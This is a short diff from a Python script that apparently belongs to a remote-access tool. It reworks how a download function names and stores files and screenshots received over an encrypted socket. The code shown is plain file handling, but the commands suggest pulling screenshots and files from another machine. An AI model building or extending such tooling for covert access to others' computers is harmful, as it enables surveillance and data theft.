@@ -83,11 +83,11 @@ def upload(command):
 
 def download(command):
     cli.sendall(crypt(command))
-    fileName = str(command[len("download "):])
-
-    if "screenshot()" in command:
+    if "screenshot" in command:
+        fileName = str(command[len("screenshot() download "):])
         f = open(startDir+os.sep+"screenshots"+os.sep+fileName, 'wb')
     else:
+        fileName = str(command[len("download "):])
         f = open(startDir+os.sep+"downloads"+os.sep+fileName, 'wb')
 
     while True:
